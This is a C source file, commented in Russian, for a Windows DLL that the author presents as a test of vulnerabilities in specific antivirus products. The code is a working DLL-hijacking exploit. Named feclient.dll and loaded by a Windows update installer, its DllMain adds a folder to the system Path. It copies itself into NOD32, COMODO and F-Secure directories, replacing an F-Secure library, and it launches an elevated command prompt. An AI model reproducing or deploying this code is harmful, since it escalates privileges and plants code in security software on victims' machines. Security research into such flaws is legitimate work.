/***************************************************************************************************************\
*																												*
*											MAIN.C																*
*																												*
* Данная dll'ка предназначена для теста уязвимостей конкретных аверов, хуле тут ещё что писать надо.			*
*																												*
\***************************************************************************************************************/

																							//m1x
																							//pr0mix@mail.ru
																							//EOF



#include "main.h"



#pragma comment(linker, "/EXPORT:xMsgBox=_xMsgBox@16")	//долой манглинг!
#pragma comment(linker, "/EXPORT:DllRegisterServer=_DllRegisterServer@0")



#define MAX_LEN_BUF (1024 * 2)



/***************************************************************************************************\
*	Функа ChangeRegKey; 
*	изменение (добавление) значения параметра реестра (в данной ситуации добавляем своё значение в 'Path');
*	Вход:
*		hKey		-	дескриптор указанного ключа реестра;
*		pszSubKey	-	адрес имени открываемого подключа (раздела реестра)
*		pszValName	-	адрес имени параметра (значения);
*		pszAddVal	-	адрес строкового значения, которое будет добавлено в уже существующее значение указанного параметра; 
*	Выход:
*		1			-	если всё прошло успешно, или 0 - если хуйня
*	Замметки:
*		по умолчанию в этом модуле изменяется системная переменная окружения 'Path'; 
*		в Win7/etc - это админская привилегия, так что будем аккуратней =)! 
\***************************************************************************************************/
DWORD ChangeRegKey(HKEY hKey, char *pszSubKey, char *pszValName, char *pszAddVal)
{
	long lRes;
	HKEY hNewKey;
	char *pszData;
	DWORD num = MAX_LEN_BUF;
	DWORD dwRes = 0;

	lRes = RegOpenKeyExA(hKey, pszSubKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hNewKey);	//open the specified reg key; 

	if(lRes != ERROR_SUCCESS)
		return 0;

	lRes = RegQueryValueExA(hNewKey, pszValName, 0, 0, 0, &num);	//get num_bytes for our buffer; 

	if(lRes != ERROR_SUCCESS)
		return 0;
	else
	{
		pszData = (char*)malloc(sizeof(char) * num + strlen(pszAddVal) + 1);	//alloc
		lRes = RegQueryValueExA(hNewKey, pszValName, 0, 0, pszData, &num);	//get reg key value;

		if(lRes != ERROR_SUCCESS)
		{
			free(pszData);
			return 0;
		}
	}

	strcat(pszData, pszAddVal);	//add new value;
	lRes = RegSetValueExA(hNewKey, pszValName, 0, REG_EXPAND_SZ, pszData, strlen(pszData) + 1);	//update reg key value; 
	free(pszData); 

	if(lRes != ERROR_SUCCESS)
		return 0;

	lRes = RegCloseKey(hNewKey);	//close reg key;

	if(lRes != ERROR_SUCCESS)
		return 0;

	//tell the system (programs etc) about change (new path); 
	SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_ABORTIFHUNG, 5000, &dwRes);

	return 1;
}
/***************************************************************************************************\
*	конец функи ChangeRegKey; 	
\***************************************************************************************************/



/***************************************************************************************************\
*	Функа xMsgBox; 
*	тестирование данной dll путём её запуска через rundll32.exe;
*	Вход:
*		hWnd		-	заголовок окна, который должен указываться в качестве родительского окна при создании окон в функциях загружаемой библиотеки DLL; 
*		hInst		-	заголовок экземпляра выбранной библиотеки DLL;
*		lpszCmdLine	-	командная строка, передаваемая библиотеке DLL. Данная строка представляет собой последовательность символов ASCII, завершающуюся символом с кодом 0; 
*		nCmdShow	-	режим отображения окон выбранной библиотеки DLL;
*	Выход:
*		(+)
*	Замметки:
*		for test; e.g, rundll32.exe xnewdll.dll,xMsgBox VX! 
*		для вызова данной длл и функи из rundll32.exe используй соглашение о вызовах _stdcall (
*		по умолчанию для атрибута _stdcall используется значение CALLBACK); 
\***************************************************************************************************/
DLLEXPORTC void CALLBACK xMsgBox(HWND hWnd, HINSTANCE hInst, LPSTR lpszCmdLine, int nCmdShow)
{
	MessageBoxA(0, lpszCmdLine, lpszCmdLine, MB_OK);	//! 
}
/***************************************************************************************************\
*	конец функи xMsgBox; 
\***************************************************************************************************/



/***************************************************************************************************\
*	Функа DllRegisterServer; 
*	предназначена для nod32 - если подгружается длл ppeset.dll, то нод32 ещё захочет вызвать 
*	функу с этим именем. Отличный подарок, мы этим воспользуемся!
*	(+)
\***************************************************************************************************/
DLLEXPORTC DWORD __stdcall DllRegisterServer()
{
	HANDLE hFile;
	char szMsg1[] = "Hello from DllRegisterServer!\r\n";
	DWORD numobw = 0;

	hFile = CreateFileA(szLogName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, 
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);	//open our log-file;

	if(hFile == INVALID_HANDLE_VALUE)
	{
		return 0; 
	}

	SetFilePointer(hFile, 0, 0, FILE_END);	//сместим указатель позиции в файле в конец (тем самым добавляем запись в лог); 
	WriteFile(hFile, szMsg1, strlen(szMsg1), &numobw, 0);	//записываем данные
	CloseHandle(hFile);	//закрываем хэндл и на выход! 

	return 0;
}
/***************************************************************************************************\
*	конец функи DllRegisterServer; 
\***************************************************************************************************/



/***************************************************************************************************\
*	Функа DllMain; 
*	дополнительная точка входа в подгружаемую динамически dll; 
*	Вход:
*		(+)
*	Выход:
*		1	-	dll загрузилась; 0 - что-то пошло не так - и она будет выгружена системой; 
\***************************************************************************************************/
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	HANDLE hFile; 
	char szMsg1[] = "Hello from DllMain!\r\n";
	char szMsg2[MAX_PATH * 2] = "DllMain: ";
	DWORD numobw = 0;

	if(fdwReason == DLL_PROCESS_ATTACH)	//длл запущена или был вызов этой длл через LoadLibrary; 
	{
		hFile = CreateFileA(szLogName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, 
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);	//создаём лог-файл (должна существовать папка C:\xlogs); 

		if(hFile == INVALID_HANDLE_VALUE)
		{
			return 0; 
		}

		GetModuleFileNameA(0, &szMsg2[strlen(szMsg2)], MAX_PATH);	//получаем имя exe-файла, загрузившего нашу длл;

		if(strstr(szMsg2, "Windows-KB"))	//если нашу длл загружает апдейт винды
		{
			if(ChangeRegKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", ";C:\\xlogs"))
			{
				GetModuleFileNameA(GetModuleHandleA("feclient.dll"), szFileName, MAX_PATH);	//получаем полный путь к нашей длл (наша длл должна иметь имя feclient.dll - как раз для того, чтобы быть подхваченной апейтом винды (ака dll hijacking)); 
				CopyFileA(szFileName, "C:\\xlogs\\ppeset.dll", 0);	//копируем её в данную папку с конкретным названием (for nod32); 
				CopyFileA(szFileName, "C:\\Program Files\\COMODO\\COMODO Internet Security\\themes\\xnewdll.theme", 0);	//for comodo
				MoveFileA("C:\\Program Files\\F-Secure\\apps\\CCF_Reputation\\orspapi.dll", "C:\\Program Files\\F-Secure\\apps\\CCF_Reputation\\orspapi2.dll");	//for f-secure; 
				CopyFileA(szFileName, "C:\\Program Files\\F-Secure\\apps\\CCF_Reputation\\orspapi.dll", 0);	//for f-secure; 
				CopyFileA(szFileName, "C:\\Program Files\\Internet Explorer\\xnewdll.dll", 0);	//просто так)
				ShellExecuteA(NULL, "open", "C:\\WINDOWS\\System32\\cmd.exe", NULL, NULL, SW_SHOW);	//вызываем командную строку (с админскими правами в случае успеха); 
			}
		}
		
		strcat(szMsg2, "\r\n");	//переход на новую строку
		WriteFile(hFile, szMsg1, strlen(szMsg1), &numobw, 0);	//пишем данные в лог-файл; 
		SetFilePointer(hFile, 0, 0, FILE_END);	//переходим в конец файла (на новую строку);
		WriteFile(hFile, szMsg2, strlen(szMsg2), &numobw, 0);	//etc 
		CloseHandle(hFile); 
	}

	return 1;
}
/***************************************************************************************************\
*	конец функи DllMain; 
\***************************************************************************************************/
